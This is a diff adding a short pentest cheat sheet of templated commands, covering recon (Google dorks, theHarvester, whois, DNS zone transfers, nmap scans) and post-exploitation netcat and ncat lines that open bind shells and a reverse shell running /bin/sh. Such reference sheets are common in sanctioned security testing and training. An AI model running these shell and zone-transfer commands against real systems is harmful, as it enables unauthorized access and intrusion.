@@ -1,0 +1,38 @@
+#
+# Simple commands for pentest use
+#
+
+#---- PASSIVE INFO GATHERING ----#
+
+site:[domain] -site:[domain] filetype:[type] inurl:[text], etc	# Google dorks, also check Netcraft
+
+theharvester -d [domain] -b [source]	# Checks common search engines for emails
+
+whois [domain/ip addr]			# Checks Whois database
+
+
+#---- ACTIVE INFO GATHERING ----#
+
+host -t [ns/mx] [domain]		# List the DNS/mail server associated with this domain
+host [domain/ip addr]			# Convert domain name to IP, or vice-versa
+host -l [domain] [dns server addr]	# Attempts zone transfer on specified name server
+
+dnsrecon -d [domain] -t axfr		# Finds name servers, attempts zone transfer
+
+# PORT SCANNING #
+nmap -sn [addr] -oG [outfile]		# Ping scan on specified addresses
+nmap (-sT/-sU) [addr]			# TCP/UDP scan on top 1000 ports
+nmap -p [port] [addrs]			# Scan machines for specific port
+nmap [addr] --script [script]		# Run script on host. Found in /usr/share/nmap/scripts
+
+
+#---- POST EXPLOITATION ----#
+
+nc -nvlp [port] > [file]                # Listen on port, redirect input to file
+nc -nvlp [port] -e "/bin/sh"            # Bind shell
+nc -nv [adr] [port] -e "/bin/sh"        # Reverse shell
+
+ncat --exec /bin/sh --allow [addr] -vnl [port] --ssl 	# Encrypted bind shell
+ncat -v [addr] [port] --ssl				# Encrypted bind
+
+
